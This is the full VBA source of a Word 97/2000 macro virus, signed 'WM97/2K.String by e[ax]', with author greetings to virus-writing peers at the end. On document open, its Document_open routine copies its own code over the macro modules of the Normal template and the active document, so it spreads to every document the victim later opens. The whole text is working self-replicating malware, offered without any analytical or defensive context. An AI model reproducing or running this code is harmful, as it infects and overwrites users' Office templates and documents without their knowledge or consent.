'e[ax]
Private Sub Document_open()
Dim KVICKJS, CHSJEUR, LCXJSIE, OCKAJRF, SIFDMXU
Set CHSJEUR = ThisDocument.VBProject.VBComponents(1).CodeModule
Set OCKAJRF = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set LCXJSIE = ActiveDocument.VBProject.VBComponents(1).CodeModule
KVICKJS = Strings.Trim(CHSJEUR.lines(1, CHSJEUR.countoflines))
SIFDMXU = Strings.LCase("'e[ax]")
If SIFDMXU <> OCKAJRF.lines(1, 1) Then
With OCKAJRF
.deletelines 1, OCKAJRF.countoflines
.insertlines 1, KVICKJS
End With
End If
If SIFDMXU <> LCXJSIE.lines(1, 1) Then
With LCXJSIE
.deletelines 1, LCXJSIE.countoflines
.insertlines 1, KVICKJS
End With
End If
'WM97/2K.String by e[ax]
'SIM v1.0 [String Infection Method] by e[ax]
'Greetz: k04x, rudeboy, BIGFOOOT, E-man, SnakeLord, t[r]ax
'H4dija, te ostale pri BIHnet.ORG-u
'SP.greetz to: Jackie 2Fl0wer, KnowDeth, ASMhead5, Mist, mort-
'nala, Giga, LifeWire, Fulvian, Staggle, SlageHamm, Perikles, Evul, and to all ppl on #virus
'10x once again for inspiration...
'VicES: Where ar u man!?
End Sub
